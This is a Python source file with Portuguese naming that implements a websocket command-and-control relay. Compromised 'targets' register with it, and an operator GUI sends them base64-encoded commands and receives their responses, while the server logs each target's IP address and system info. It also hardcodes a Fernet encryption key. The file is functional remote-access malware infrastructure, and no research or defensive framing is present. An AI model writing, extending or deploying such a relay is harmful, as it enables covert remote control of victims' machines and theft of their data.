import os, threading, base64, asyncio, websockets
from cryptography.fernet import Fernet

CHAVE = b'RAlFuqD9uFroOFgpJUPE5zWG0WjGEfewa4_MTUe_2MM='
FER = Fernet(CHAVE)

alvos = {}
gui_ws = None
lock = threading.Lock()
prox_id = 1

async def enviar_gui(texto):
    global gui_ws
    with lock:
        if not gui_ws: return
        try: await gui_ws.send(texto)
        except: gui_ws = None

async def tratar_conexao(ws):
    global gui_ws, prox_id
    try:
        prim = await ws.recv()
        if prim == "SOU_GUI":
            with lock: gui_ws = ws
            print("[RELAY] GUI CONECTADA")
            await ws.send("OK_GUI")
            async for msg in ws:
                if msg.startswith("CMD|"):
                    _, aid_b, b64 = msg.split("|",2)
                    aid = int(aid_b)
                    dados = base64.b64decode(b64)
                    with lock:
                        if aid in alvos:
                            await alvos[aid]["ws"].send(dados.decode())
        else:
            aid = prox_id
            prox_id +=1
            info = prim
            ip = ws.remote_address[0]
            with lock:
                alvos[aid] = {"ws":ws,"ip":ip,"info":info}
            print(f"[RELAY] ALVO {aid} CONECTADO: {info}")
            await enviar_gui(f"NOVO_ALVO|{aid}|{ip}|{info}")
            async for msg in ws:
                await enviar_gui(f"RESPOSTA|{aid}|{base64.b64encode(msg.encode()).decode()}")
    finally:
        if prim != "SOU_GUI":
            with lock: alvos.pop(aid, None)
            await enviar_gui(f"SAIU_ALVO|{aid}")
            print(f"[RELAY] ALVO {aid} DESCONECTADO")

async def main():
    PORTA = int(os.environ.get("PORT", 9001))
    async with websockets.serve(tratar_conexao, "0.0.0.0", PORTA):
        print(f"[RELAY] WEBSOCKET NA PORTA {PORTA}")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())